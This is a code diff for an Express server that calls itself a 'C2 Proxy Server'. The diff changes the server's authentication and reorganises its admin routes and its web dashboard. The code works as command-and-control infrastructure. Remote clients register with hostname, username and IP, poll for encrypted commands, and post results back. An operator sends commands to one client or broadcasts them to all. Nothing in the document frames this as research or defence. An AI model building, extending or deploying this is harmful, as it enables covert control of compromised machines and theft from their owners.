@@ -4,7 +4,6 @@ import cors from 'cors';
 import compression from 'compression';
 import helmet from 'helmet';
 import rateLimit from 'express-rate-limit';
-import session from 'express-session';
 import { WebSocketServer } from 'ws';
 import http from 'http';
 
@@ -22,18 +21,11 @@ const server = http.createServer(app);
 const wss = new WebSocketServer({ server });
 
 // ==================== MIDDLEWARE ====================
-app.use(session({
-    secret: SESSION_SECRET,
-    resave: false,
-    saveUninitialized: false,
-    cookie: { maxAge: 24 * 60 * 60 * 1000 }
-}));
-
-app.use(helmet({ contentSecurityPolicy: false, crossOriginEmbedderPolicy: false }));
-app.use(compression());
-app.use(cors());
 app.use(express.json({ limit: '100mb' }));
 app.use(express.urlencoded({ extended: true, limit: '100mb' }));
+app.use(cors());
+app.use(compression());
+app.use(helmet({ contentSecurityPolicy: false, crossOriginEmbedderPolicy: false }));
 
 const limiter = rateLimit({
     windowMs: 15 * 60 * 1000,
@@ -136,20 +128,18 @@ const cryptoManager = new CryptoManager(ENCRYPTION_KEY);
 
 // ==================== AUTH ====================
 async function authenticate(req, res, next) {
-    if (req.session && req.session.isAuthenticated) {
+    const authHeader = req.headers.authorization;
+    if (!authHeader || !authHeader.startsWith('Bearer ')) {
+        return res.status(401).json({ error: 'Unauthorized - Please login first' });
+    }
+    
+    const token = authHeader.substring(7);
+    const validTokens = await store.get('admin_tokens') || [];
+    if (validTokens.includes(token)) {
         return next();
     }
     
-    const authHeader = req.headers.authorization;
-    if (authHeader && authHeader.startsWith('Bearer ')) {
-        const token = authHeader.substring(7);
-        const validTokens = await store.get('admin_tokens') || [];
-        if (validTokens.includes(token)) {
-            return next();
-        }
-    }
-    
-    res.status(401).json({ error: 'Unauthorized - Please login first' });
+    res.status(401).json({ error: 'Invalid or expired token' });
 }
 
 async function generateAdminToken() {
@@ -249,7 +239,7 @@ class AnalyticsEngine {
 
 const analytics = new AnalyticsEngine(store);
 
-// ==================== ✅ PUBLIC API ENDPOINTS (No Auth Required) ====================
+// ==================== PUBLIC API ENDPOINTS ====================
 
 // Health Check
 app.get('/health', (req, res) => {
@@ -265,23 +255,10 @@ app.get('/health', (req, res) => {
 
 // Root
 app.get('/', (req, res) => {
-    res.json({
-        name: 'C2 Proxy Server',
-        version: '3.0.0',
-        status: 'running',
-        endpoints: {
-            health: '/health',
-            dashboard: '/dashboard',
-            register: 'POST /api/register (PUBLIC)',
-            poll: 'POST /api/poll (PUBLIC)',
-            results: 'POST /api/results (PUBLIC)',
-            heartbeat: 'POST /api/heartbeat (PUBLIC)',
-            admin: '/api/admin/* (Requires Auth)'
-        }
-    });
+    res.redirect('/login');
 });
 
-// ✅ PUBLIC: Register Client (NO AUTH REQUIRED)
+// ✅ PUBLIC: Register Client
 app.post('/api/register', async (req, res) => {
     try {
         const { clientId, hostname, username, ip } = req.body;
@@ -314,7 +291,7 @@ app.post('/api/register', async (req, res) => {
     }
 });
 
-// ✅ PUBLIC: Poll for Commands (NO AUTH REQUIRED)
+// ✅ PUBLIC: Poll for Commands
 app.post('/api/poll', async (req, res) => {
     try {
         const { clientId, encryptedData } = req.body;
@@ -346,7 +323,7 @@ app.post('/api/poll', async (req, res) => {
     }
 });
 
-// ✅ PUBLIC: Send Results (NO AUTH REQUIRED)
+// ✅ PUBLIC: Send Results
 app.post('/api/results', async (req, res) => {
     try {
         const { clientId, encryptedData } = req.body;
@@ -392,7 +369,7 @@ app.post('/api/results', async (req, res) => {
     }
 });
 
-// ✅ PUBLIC: Heartbeat (NO AUTH REQUIRED)
+// ✅ PUBLIC: Heartbeat
 app.post('/api/heartbeat', async (req, res) => {
     try {
         const { clientId } = req.body;
@@ -408,219 +385,37 @@ app.post('/api/heartbeat', async (req, res) => {
     }
 });
 
-// ==================== ADMIN API (Protected) ====================
+// ==================== ADMIN API ====================
 
 // Admin Login
 app.post('/api/admin/login', async (req, res) => {
     try {
         const { username, password } = req.body;
+        console.log(`🔑 Login attempt: ${username}`);
+        
         if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
             const token = await generateAdminToken();
-            res.json({ status: 'success', token, expiresIn: 86400 });
+            console.log(`✅ Login successful for ${username}`);
+            res.json({ 
+                status: 'success', 
+                token,
+                username,
+                expiresIn: 86400
+            });
         } else {
+            console.log(`❌ Login failed for ${username}`);
             res.status(401).json({ error: 'Invalid credentials' });
         }
     } catch (err) {
+        console.error('Login error:', err);
         res.status(500).json({ error: err.message });
     }
 });
 
-// Admin Logout
-app.post('/api/admin/logout', authenticate, async (req, res) => {
-    req.session.destroy();
-    res.json({ status: 'success', message: 'Logged out' });
-});
+// ==================== DASHBOARD PAGES ====================
 
-// Get all clients (Protected)
-app.get('/api/admin/clients', authenticate, async (req, res) => {
-    try {
-        const clients = await store.get('clients') || [];
-        const clientData = [];
-        for (const id of clients) {
-            const data = await store.get(`client:${id}`);
-            if (data) {
-                const pending = await store.get(`pending:${id}`) || [];
-                const results = await store.get(`results:${id}`) || [];
-                data.pendingCommands = pending.length;
-                data.resultsCount = results.length;
-                clientData.push(data);
-            }
-        }
-        clientData.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
-        res.json({ clients: clientData });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-// Get client details (Protected)
-app.get('/api/admin/clients/:clientId', authenticate, async (req, res) => {
-    try {
-        const { clientId } = req.params;
-        const client = await store.get(`client:${clientId}`);
-        if (!client) {
-            return res.status(404).json({ error: 'Client not found' });
-        }
-        
-        const pending = await store.get(`pending:${clientId}`) || [];
-        const results = await store.get(`results:${clientId}`) || [];
-        const history = await store.get(`history:${clientId}`) || [];
-        
-        const fullResults = [];
-        for (const key of results.slice(-20)) {
-            const result = await store.get(key);
-            if (result) {
-                fullResults.push(result);
-            }
-        }
-        
-        res.json({
-            client,
-            pending: pending.length,
-            results: fullResults,
-            history: history.slice(-20)
-        });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-// Send command to client (Protected)
-app.post('/api/admin/command', authenticate, async (req, res) => {
-    try {
-        const { clientId, command } = req.body;
-        if (!clientId || !command) {
-            return res.status(400).json({ error: 'clientId and command required' });
-        }
-        
-        const commandId = Date.now().toString();
-        const commandEntry = {
-            id: commandId,
-            command,
-            timestamp: new Date().toISOString(),
-            status: 'pending'
-        };
-        
-        const pendingCommands = await store.get(`pending:${clientId}`) || [];
-        pendingCommands.push(commandEntry);
-        await store.set(`pending:${clientId}`, pendingCommands);
-        
-        await analytics.log('command_sent', { clientId, commandId, command });
-        res.json({ status: 'success', commandId });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-// Broadcast command to all clients (Protected)
-app.post('/api/admin/broadcast', authenticate, async (req, res) => {
-    try {
-        const { command } = req.body;
-        if (!command) {
-            return res.status(400).json({ error: 'command required' });
-        }
-        
-        const clients = await store.get('clients') || [];
-        const results = [];
-        for (const clientId of clients) {
-            const commandId = Date.now().toString() + '-' + crypto.randomBytes(4).toString('hex');
-            const commandEntry = {
-                id: commandId,
-                command,
-                timestamp: new Date().toISOString(),
-                status: 'pending'
-            };
-            
-            const pendingCommands = await store.get(`pending:${clientId}`) || [];
-            pendingCommands.push(commandEntry);
-            await store.set(`pending:${clientId}`, pendingCommands);
-            results.push({ clientId, commandId });
-        }
-        
-        await analytics.log('broadcast', { command, clientCount: clients.length });
-        res.json({ status: 'success', broadcasted: results.length, clients: results });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-// Get results for client (Protected)
-app.get('/api/admin/results/:clientId', authenticate, async (req, res) => {
-    try {
-        const { clientId } = req.params;
-        const { limit = 50, offset = 0 } = req.query;
-        
-        const resultKeys = await store.get(`results:${clientId}`) || [];
-        const results = [];
-        
-        const start = resultKeys.length - parseInt(limit) - parseInt(offset);
-        const end = resultKeys.length - parseInt(offset);
-        
-        for (let i = start; i < end && i >= 0; i++) {
-            const data = await store.get(resultKeys[i]);
-            if (data) {
-                results.push(data);
-            }
-        }
-        
-        res.json({ results: results.reverse(), total: resultKeys.length });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-// Delete client (Protected)
-app.delete('/api/admin/clients/:clientId', authenticate, async (req, res) => {
-    try {
-        const { clientId } = req.params;
-        const clients = await store.get('clients') || [];
-        const index = clients.indexOf(clientId);
-        if (index > -1) {
-            clients.splice(index, 1);
-            await store.set('clients', clients);
-        }
-        
-        await store.delete(`client:${clientId}`);
-        await store.delete(`pending:${clientId}`);
-        await store.delete(`history:${clientId}`);
-        await store.delete(`results:${clientId}`);
-        
-        await analytics.log('client_deleted', { clientId });
-        res.json({ status: 'success', message: 'Client deleted' });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-// Analytics (Protected)
-app.get('/api/admin/analytics', authenticate, async (req, res) => {
-    try {
-        const { range = '24h' } = req.query;
-        const stats = await clientManager.getStats();
-        res.json({ stats, timestamp: new Date().toISOString() });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-// ==================== DASHBOARD ====================
-
-app.get('/dashboard', (req, res) => {
-    // Check if logged in via session
-    if (req.session && req.session.isAuthenticated) {
-        return res.send(getDashboardHTML(req.session.username || 'admin'));
-    }
-    
-    // If not logged in, redirect to login
-    res.redirect('/login');
-});
-
-// Login page
+// Login Page
 app.get('/login', (req, res) => {
-    if (req.session && req.session.isAuthenticated) {
-        return res.redirect('/dashboard');
-    }
-    
     res.send(`
 <!DOCTYPE html>
 <html>
@@ -659,10 +454,7 @@ app.get('/login', (req, res) => {
             color: #e0e0e0;
             font-size: 14px;
         }
-        .form-group input:focus {
-            outline: none;
-            border-color: #00ff88;
-        }
+        .form-group input:focus { outline: none; border-color: #00ff88; }
         .login-btn {
             width: 100%;
             padding: 12px;
@@ -711,7 +503,7 @@ app.get('/login', (req, res) => {
         <form id="loginForm" onsubmit="handleLogin(event)">
             <div class="form-group">
                 <label for="username">Username</label>
-                <input type="text" id="username" placeholder="Enter username" required>
+                <input type="text" id="username" placeholder="Enter username" value="admin" required>
             </div>
             <div class="form-group">
                 <label for="password">Password</label>
@@ -748,7 +540,8 @@ app.get('/login', (req, res) => {
                 
                 const data = await response.json();
                 
-                if (response.ok && data.status === 'success') {
+                if (response.ok && data.token) {
+                    localStorage.setItem('token', data.token);
                     window.location.href = '/dashboard';
                 } else {
                     errorMessage.textContent = '❌ ' + (data.error || 'Invalid credentials');
@@ -756,6 +549,7 @@ app.get('/login', (req, res) => {
                     loginBtn.disabled = false;
                     loginBtn.textContent = '🔐 Login';
                     document.getElementById('password').value = '';
+                    document.getElementById('password').focus();
                 }
             } catch (error) {
                 errorMessage.textContent = '❌ Connection error. Please try again.';
@@ -764,14 +558,23 @@ app.get('/login', (req, res) => {
                 loginBtn.textContent = '🔐 Login';
             }
         }
+
+        document.getElementById('password').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                document.getElementById('loginForm').dispatchEvent(new Event('submit'));
+            }
+        });
+
+        document.getElementById('username').focus();
     </script>
 </body>
 </html>
     `);
 });
 
-function getDashboardHTML(username) {
-    return `
+// Dashboard Page
+app.get('/dashboard', (req, res) => {
+    res.send(`
 <!DOCTYPE html>
 <html>
 <head>
@@ -784,8 +587,9 @@ function getDashboardHTML(username) {
         h1 { color: #00ff88; border-bottom: 2px solid #00ff88; padding-bottom: 10px; }
         .card { background: #141d2b; border-radius: 10px; padding: 20px; margin: 20px 0; border: 1px solid #1e2d3d; }
         .card h2 { color: #00ff88; margin-bottom: 15px; }
-        .client-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 15px; }
-        .client-card { background: #1a2535; padding: 15px; border-radius: 8px; border-left: 3px solid #00ff88; }
+        .client-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 15px; max-height: 500px; overflow-y: auto; }
+        .client-card { background: #1a2535; padding: 15px; border-radius: 8px; border-left: 3px solid #00ff88; cursor: pointer; transition: all 0.3s; }
+        .client-card:hover { background: #1e2d3d; transform: translateX(5px); }
         .client-card .id { color: #00ff88; font-weight: bold; }
         .client-card .detail { color: #8899aa; font-size: 0.9em; }
         .status { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 0.8em; }
@@ -794,8 +598,8 @@ function getDashboardHTML(username) {
         .flex { display: flex; gap: 10px; flex-wrap: wrap; }
         .flex > * { flex: 1; min-width: 200px; }
         input { background: #0a0e17; color: #e0e0e0; border: 1px solid #1e2d3d; padding: 10px; border-radius: 5px; width: 100%; }
-        button { background: #00ff88; color: #0a0e17; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
-        button:hover { background: #00cc66; }
+        button { background: #00ff88; color: #0a0e17; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; transition: all 0.3s; }
+        button:hover { background: #00cc66; transform: scale(1.02); }
         .logout-btn { background: #ff4444; color: white; }
         .logout-btn:hover { background: #cc0000; }
         .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin-bottom: 20px; }
@@ -803,6 +607,9 @@ function getDashboardHTML(username) {
         .stat-card .number { font-size: 28px; font-weight: bold; color: #00ff88; }
         .stat-card .label { color: #8899aa; font-size: 12px; text-transform: uppercase; }
         .output { background: #0a0e17; padding: 15px; border-radius: 5px; font-family: monospace; white-space: pre-wrap; max-height: 300px; overflow-y: auto; }
+        .loading { color: #ffaa00; }
+        .error { color: #ff4444; }
+        .success { color: #00ff88; }
     </style>
 </head>
 <body>
@@ -810,7 +617,7 @@ function getDashboardHTML(username) {
     <div class="header">
         <h1>🎯 C2 Proxy Dashboard</h1>
         <div>
-            <span style="color: #8899aa;">👤 ${username}</span>
+            <span style="color: #8899aa;">👤 admin</span>
             <button class="logout-btn" onclick="logout()">🚪 Logout</button>
         </div>
     </div>
@@ -849,6 +656,7 @@ function getDashboardHTML(username) {
 
 <script>
     let token = localStorage.getItem('token');
+    if (!token) { window.location.href = '/login'; }
     
     function getHeaders() {
         return {
@@ -864,11 +672,12 @@ function getDashboardHTML(username) {
     
     function loadClients() {
         const grid = document.getElementById('clients');
-        grid.innerHTML = '⏳ Loading...';
+        grid.innerHTML = '<span class="loading">⏳ Loading...</span>';
         
         fetch('/api/admin/clients', { headers: getHeaders() })
             .then(res => {
                 if (res.status === 401) {
+                    localStorage.removeItem('token');
                     window.location.href = '/login';
                     return;
                 }
@@ -877,7 +686,7 @@ function getDashboardHTML(username) {
             .then(data => {
                 if (!data) return;
                 if (data.error) {
-                    grid.innerHTML = '❌ ' + data.error;
+                    grid.innerHTML = '<span class="error">❌ ' + data.error + '</span>';
                     return;
                 }
                 
@@ -889,8 +698,7 @@ function getDashboardHTML(username) {
                     return;
                 }
                 
-                let online = 0;
-                let offline = 0;
+                let online = 0, offline = 0;
                 grid.innerHTML = '';
                 data.clients.forEach(client => {
                     const lastSeen = new Date(client.lastSeen);
@@ -919,14 +727,13 @@ function getDashboardHTML(username) {
                 document.getElementById('offline').textContent = offline;
             })
             .catch(err => {
-                grid.innerHTML = '❌ Error: ' + err.message;
+                grid.innerHTML = '<span class="error">❌ Error: ' + err.message + '</span>';
             });
     }
     
     function sendCommand() {
         const clientId = document.getElementById('clientId').value.trim();
         const command = document.getElementById('command').value.trim();
-        
         if (!clientId || !command) {
             alert('Enter both Client ID and Command');
             return;
@@ -940,21 +747,25 @@ function getDashboardHTML(username) {
             body: JSON.stringify({ clientId, command })
         })
         .then(res => {
-            if (res.status === 401) { window.location.href = '/login'; return; }
+            if (res.status === 401) {
+                localStorage.removeItem('token');
+                window.location.href = '/login';
+                return;
+            }
             return res.json();
         })
         .then(data => {
             if (!data) return;
             if (data.error) {
-                document.getElementById('result').innerHTML = '❌ ' + data.error;
+                document.getElementById('result').innerHTML = '<span class="error">❌ ' + data.error + '</span>';
             } else {
-                document.getElementById('result').innerHTML = '✅ Command sent! ID: ' + data.commandId;
+                document.getElementById('result').innerHTML = '<span class="success">✅ Command sent! ID: ' + data.commandId + '</span>';
                 document.getElementById('command').value = '';
                 setTimeout(() => loadResults(clientId), 3000);
             }
         })
         .catch(err => {
-            document.getElementById('result').innerHTML = '❌ Error: ' + err.message;
+            document.getElementById('result').innerHTML = '<span class="error">❌ Error: ' + err.message + '</span>';
         });
     }
     
@@ -974,19 +785,23 @@ function getDashboardHTML(username) {
             body: JSON.stringify({ command })
         })
         .then(res => {
-            if (res.status === 401) { window.location.href = '/login'; return; }
+            if (res.status === 401) {
+                localStorage.removeItem('token');
+                window.location.href = '/login';
+                return;
+            }
             return res.json();
         })
         .then(data => {
             if (!data) return;
             if (data.error) {
-                document.getElementById('result').innerHTML = '❌ ' + data.error;
+                document.getElementById('result').innerHTML = '<span class="error">❌ ' + data.error + '</span>';
             } else {
-                document.getElementById('result').innerHTML = '✅ Broadcasted to ' + data.broadcasted + ' clients';
+                document.getElementById('result').innerHTML = '<span class="success">✅ Broadcasted to ' + data.broadcasted + ' clients</span>';
             }
         })
         .catch(err => {
-            document.getElementById('result').innerHTML = '❌ Error: ' + err.message;
+            document.getElementById('result').innerHTML = '<span class="error">❌ Error: ' + err.message + '</span>';
         });
     }
     
@@ -996,13 +811,17 @@ function getDashboardHTML(username) {
         
         fetch('/api/admin/results/' + clientId, { headers: getHeaders() })
             .then(res => {
-                if (res.status === 401) { window.location.href = '/login'; return; }
+                if (res.status === 401) {
+                    localStorage.removeItem('token');
+                    window.location.href = '/login';
+                    return;
+                }
                 return res.json();
             })
             .then(data => {
                 if (!data) return;
                 if (data.error) {
-                    outputEl.innerHTML = '❌ ' + data.error;
+                    outputEl.innerHTML = '<span class="error">❌ ' + data.error + '</span>';
                     return;
                 }
                 if (!data.results || data.results.length === 0) {
@@ -1018,18 +837,113 @@ function getDashboardHTML(username) {
                 outputEl.innerHTML = html;
             })
             .catch(err => {
-                outputEl.innerHTML = '❌ Error: ' + err.message;
+                outputEl.innerHTML = '<span class="error">❌ Error: ' + err.message + '</span>';
             });
     }
     
-    // Auto-refresh
+    // Load clients on page load
     loadClients();
     setInterval(loadClients, 30000);
 </script>
 </body>
 </html>
-    `;
-}
+    `);
+});
+
+// ==================== PROTECTED ADMIN API ====================
+
+app.get('/api/admin/clients', authenticate, async (req, res) => {
+    try {
+        const clients = await store.get('clients') || [];
+        const clientData = [];
+        for (const id of clients) {
+            const data = await store.get(`client:${id}`);
+            if (data) {
+                const pending = await store.get(`pending:${id}`) || [];
+                const results = await store.get(`results:${id}`) || [];
+                data.pendingCommands = pending.length;
+                data.resultsCount = results.length;
+                clientData.push(data);
+            }
+        }
+        clientData.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
+        res.json({ clients: clientData });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+app.post('/api/admin/command', authenticate, async (req, res) => {
+    try {
+        const { clientId, command } = req.body;
+        if (!clientId || !command) {
+            return res.status(400).json({ error: 'clientId and command required' });
+        }
+        
+        const commandId = Date.now().toString();
+        const commandEntry = {
+            id: commandId,
+            command,
+            timestamp: new Date().toISOString(),
+            status: 'pending'
+        };
+        
+        const pendingCommands = await store.get(`pending:${clientId}`) || [];
+        pendingCommands.push(commandEntry);
+        await store.set(`pending:${clientId}`, pendingCommands);
+        
+        await analytics.log('command_sent', { clientId, commandId, command });
+        res.json({ status: 'success', commandId });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+app.post('/api/admin/broadcast', authenticate, async (req, res) => {
+    try {
+        const { command } = req.body;
+        if (!command) {
+            return res.status(400).json({ error: 'command required' });
+        }
+        
+        const clients = await store.get('clients') || [];
+        const results = [];
+        for (const clientId of clients) {
+            const commandId = Date.now().toString() + '-' + crypto.randomBytes(4).toString('hex');
+            const commandEntry = {
+                id: commandId,
+                command,
+                timestamp: new Date().toISOString(),
+                status: 'pending'
+            };
+            
+            const pendingCommands = await store.get(`pending:${clientId}`) || [];
+            pendingCommands.push(commandEntry);
+            await store.set(`pending:${clientId}`, pendingCommands);
+            results.push({ clientId, commandId });
+        }
+        
+        await analytics.log('broadcast', { command, clientCount: clients.length });
+        res.json({ status: 'success', broadcasted: results.length, clients: results });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+app.get('/api/admin/results/:clientId', authenticate, async (req, res) => {
+    try {
+        const { clientId } = req.params;
+        const resultKeys = await store.get(`results:${clientId}`) || [];
+        const results = [];
+        for (const key of resultKeys.slice(-20)) {
+            const data = await store.get(key);
+            if (data) results.push(data);
+        }
+        res.json({ results: results.reverse() });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
 
 // ==================== WEBSOCKET ====================
 wss.on('connection', (ws) => {
